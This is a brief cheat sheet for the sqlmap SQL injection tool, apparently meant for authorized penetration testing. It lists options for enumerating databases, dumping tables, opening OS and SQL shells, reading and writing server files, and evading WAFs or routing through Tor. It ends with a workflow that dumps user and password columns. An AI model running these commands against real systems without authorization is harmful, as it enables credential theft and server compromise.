# SQLmap Cheat Sheet (Short)

> Use only on systems you own or have written permission to test.

## Basics

```
sqlmap -u "<target URL>" [options]
```

## Target & Request

| Option | Meaning |
|---|---|
| `-u <URL>` | Target URL |
| `-r <file>` | Load request from saved file (e.g. Burp) |
| `--data="id=1"` | Send data via POST |
| `--cookie="..."` | Inject via cookie |
| `--proxy="http://127.0.0.1:8080"` | Route through Burp/proxy |
| `--random-agent` | Random User-Agent |

## Detection

| Option | Meaning |
|---|---|
| `--level=1-5` | Test depth (higher = more tests) |
| `--risk=1-3` | Payload risk (higher = more intrusive) |
| `-p <param>` | Test specific parameter only |
| `--dbms=mysql` | Specify DBMS |
| `--batch` | Non-interactive mode |

## Enumeration

| Option | Meaning |
|---|---|
| `--dbs` | List databases |
| `--current-db` | Current database |
| `--current-user` | Current DB user |
| `--is-dba` | Check admin rights |
| `-D <db>` | Select database |
| `--tables` | List tables |
| `-T <table>` | Select table |
| `--columns` | List columns |
| `-C <col1,col2>` | Select columns |
| `--dump` | Dump table data |
| `--dump-all` | Dump everything |

## Exploitation

| Option | Meaning |
|---|---|
| `--os-shell` | Interactive OS shell |
| `--sql-shell` | Interactive SQL shell |
| `--sql-query="..."` | Run one SQL query |
| `--file-read=<path>` | Read a server file |
| `--file-write=<local>` | Upload a file |

## Evasion

| Option | Meaning |
|---|---|
| `--tamper=<script>` | Bypass WAF/filters |
| `--delay=1` | Slow down requests |
| `--tor` | Route via Tor |

## Common Workflow

```
sqlmap -u "http://target.com/page?id=1" --batch           # check
sqlmap -u "..." --dbs                                      # list DBs
sqlmap -u "..." -D dbname --tables                          # list tables
sqlmap -u "..." -D dbname -T users --columns                 # list columns
sqlmap -u "..." -D dbname -T users -C user,pass --dump       # dump data
```
